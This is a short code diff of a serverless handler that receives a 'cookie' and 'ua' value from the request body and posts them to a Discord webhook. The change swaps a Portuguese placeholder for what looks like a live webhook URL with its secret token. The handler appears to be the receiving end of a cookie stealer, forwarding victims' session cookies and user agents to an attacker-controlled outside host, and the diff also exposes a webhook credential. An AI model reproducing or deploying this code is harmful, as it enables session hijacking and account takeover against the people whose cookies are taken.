@@ -1,6 +1,6 @@
 export default async function handler(req, res) {
   const { cookie, ua } = req.body || {}
-  const webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI"
+  const webhook = "https://discord.com/api/webhooks/1391100473494470850/eEp6ydXja0MP9iSjkgD3q_DF5PSodCvgNm1yvGnY3iXECrtruy9k44MaODs9fu8j01oE"
 
   await fetch(webhook, {
     method: "POST",
